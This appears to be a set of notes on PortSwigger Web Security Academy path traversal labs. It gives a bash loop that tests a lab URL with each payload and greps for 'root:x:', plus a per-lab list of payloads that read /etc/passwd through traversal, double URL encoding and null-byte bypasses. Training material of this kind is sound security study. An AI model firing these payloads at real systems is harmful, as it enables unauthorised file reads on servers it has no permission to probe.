
# Test if vulnerable to LFI
```bash
curl -i -s 'https://0a2000c704c676fb80aab71a001a000d.web-security-academy.net' | grep '/image?filename=' && echo 'Test for LFI!! Found parameter pointing to image.'
```

```bash
cat pathTraversal.txt | while read payload; do curl -i 'https://0a2000c704c676fb80aab71a001a000d.web-security-academy.net/'$payload | grep 'root:x:' && echo "[+] Vulnerable to: "$payload; done
```

## [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

../../../etc/passwd

## [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

etc/passwd

## [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

....//....//....//....//etc/passwd

## [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)


..%252f..%252f..%252fetc/passwd

- Have to double URL encode this one.
## [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)


var/www/images/../../../etc/passwd
## [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

../../../etc/passwd%00.png

# Payload List


../../../etc/passwd
etc/passwd
....//....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
var/www/images/../../../etc/passwd
../../../etc/passwd%00.png

